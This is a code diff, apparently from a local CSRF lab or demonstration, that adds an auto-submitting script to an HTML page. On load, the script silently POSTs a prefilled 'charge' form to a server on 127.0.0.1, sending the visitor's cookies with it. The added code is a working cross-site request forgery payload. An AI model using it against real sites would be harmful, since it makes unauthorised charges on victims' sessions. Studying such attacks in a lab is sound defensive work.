@@ -10,15 +10,40 @@
     <form action="http://127.0.0.1:8002/logIn">
         <input type="submit" value="Log In">
     </form>
+
     <form action="http://127.0.0.1:8002/logOut">
         <input type="submit" value="Log Out">
     </form>
     <br>
-    <form action="http://127.0.0.1:8002/charge" method='post'>
+
+    <form name="crg" action="http://127.0.0.1:8002/charge" method="post">
         How much do you want to invest <br>
-        <input type="number" required="required" name="cake"> <br>
+        <input type="number" name="cake" value="10"> <br>
         <input type="submit" value="POST">
     </form>
+
+    <script>
+        window.onload = function() {
+            setTimeout(autoSend, 10)
+        };
+
+        function autoSend(){
+            let
+                oldForm = document.forms.crg,
+                formData = new FormData(oldForm),
+                url = oldForm.getAttribute('action'),
+                method = oldForm.getAttribute('method')
+            ;
+            fetch(url, {
+                method: method,
+                body: formData,
+                mode: 'no-cors',
+                credentials: 'include',
+                headers: {'Content-Type': 'text/html'},
+            });
+        }
+    </script>
+
 </body>
 
 </html>
